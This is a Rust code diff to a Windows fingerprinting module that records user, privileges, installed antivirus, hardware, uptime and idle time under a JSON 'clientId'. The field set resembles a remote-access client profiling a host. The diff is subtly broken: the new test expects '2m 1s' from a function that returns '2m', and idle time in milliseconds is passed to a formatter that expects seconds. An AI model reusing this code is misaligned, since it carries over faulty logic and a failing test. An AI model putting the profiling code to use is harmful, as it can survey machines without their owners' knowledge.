@@ -11,6 +11,18 @@ pub fn fingerprint() -> String {
     derive(&machine_id, &hwid).0
 }
 
+pub fn host(fp: &str) -> String {
+    let os = clean(ps(text::OS));
+    let arch = env::var("PROCESSOR_ARCHITECTURE").unwrap_or_else(|_| "x86_64".into());
+    format!(
+        "{{\"clientId\":\"{}\",\"os\":\"{}\",\"arch\":\"{}\",\"version\":\"{}\"}}",
+        json(fp),
+        json(&os),
+        json(&arch),
+        json(text::VERSION)
+    )
+}
+
 #[cfg(test)]
 fn from_id(machine_id: &str) -> String {
     let hwid = digest(format!("{machine_id}|windows").as_bytes());
@@ -51,6 +63,7 @@ pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
     let antivirus = clean(ps(text::AV));
     let ram = clean(ps(text::RAM));
     let uptime = clean(ps(text::UPTIME));
+    let os = clean(ps(text::OS));
     let afk = afk();
     let country = if matches!(target, "127.0.0.1" | "::1" | "localhost") {
         "Local"
@@ -66,12 +79,12 @@ pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
         user,
         text::VERSION.into(),
         privileges,
-        "Windows".into(),
+        os,
         gpu,
         cpu,
         ram,
         antivirus,
-        uptime,
+        uptime_human(ps(text::UPTIME)),
         afk,
         ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")),
         hwid,
@@ -139,10 +152,32 @@ fn afk() -> String {
         };
         if unsafe { GetLastInputInfo(&mut info) } != 0 {
             let now = unsafe { GetTickCount() };
-            return format!("{}s", now.wrapping_sub(info.tick) / 1000);
+            return human(now.wrapping_sub(info.tick) as u64);
         }
     }
     "0s".into()
+}
+
+fn uptime_human(v: String) -> String {
+    v.trim()
+        .parse::<u64>()
+        .map(human)
+        .unwrap_or_else(|_| "Unknown".into())
+}
+
+fn human(mut secs: u64) -> String {
+    let d = secs / 86_400;
+    secs %= 86_400;
+    let h = secs / 3_600;
+    secs %= 3_600;
+    let m = secs / 60;
+    let s = secs % 60;
+    let mut out = String::new();
+    if d > 0 { out.push_str(&format!("{d}d")); }
+    if h > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{h}h")); }
+    if m > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{m}m")); }
+    if out.is_empty() { out.push_str(&format!("{s}s")); }
+    out
 }
 
 fn ps(script: &str) -> String {
@@ -163,11 +198,11 @@ fn ps(script: &str) -> String {
 
 fn clean(v: String) -> String {
     let s = v.replace('|', "/").replace(['\r', '\n'], " ").trim().to_string();
-    if s.is_empty() {
-        "Unknown".into()
-    } else {
-        s
-    }
+    if s.is_empty() { "Unknown".into() } else { s }
+}
+
+fn json(v: &str) -> String {
+    v.replace('\\', "\\\\").replace('"', "\\\"")
 }
 
 fn hex(bytes: &[u8]) -> String {
@@ -183,30 +218,23 @@ mod tests {
         let machine_id = "00112233-4455-6677-8899-aabbccddeeff";
         let hwid = super::digest(format!("{machine_id}|windows").as_bytes());
         let (fingerprint, seed) = super::derive(machine_id, &hwid);
-        assert_eq!(
-            hwid,
-            "b8aaf957abbdd67c3f611b113886e4dd656375b2b1e6c8ec11edaddd13af918b"
-        );
-        assert_eq!(
-            super::hex(&seed),
-            "0baa1679f8562ab33b4ce4b27ae355130ff1d758a530b98134a68ef49b85adee"
-        );
-        assert_eq!(
-            fingerprint,
-            "14f30ccfbc5b248cc89c5dede0e41fe2d7f427ff6b092a5dfd70e6f4d93994f9"
-        );
-        assert_eq!(
-            from_id(machine_id),
-            "14f30ccfbc5b248cc89c5dede0e41fe2d7f427ff6b092a5dfd70e6f4d93994f9"
-        );
+        assert_eq!(hwid, "b8aaf957abbdd67c3f611b113886e4dd656375b2b1e6c8ec11edaddd13af918b");
+        assert_eq!(super::hex(&seed), "0baa1679f8562ab33b4ce4b27ae355130ff1d758a530b98134a68ef49b85adee");
+        assert_eq!(fingerprint, "14f30ccfbc5b248cc89c5dede0e41fe2d7f427ff6b092a5dfd70e6f4d93994f9");
+        assert_eq!(from_id(machine_id), fingerprint);
     }
 
     #[test]
     fn telemetry_contract() {
         let fp = "0".repeat(64);
-        assert_eq!(
-            super::record("127.0.0.1", Some(1), &fp).split('|').count(),
-            16
-        );
+        assert_eq!(super::record("127.0.0.1", Some(1), &fp).split('|').count(), 16);
+    }
+
+    #[test]
+    fn uptime_human_contract() {
+        assert_eq!(super::human(30), "30s");
+        assert_eq!(super::human(121), "2m 1s");
+        assert_eq!(super::human(7320), "2h 2m");
+        assert_eq!(super::human(97_260), "1d 3h 1m");
     }
 }
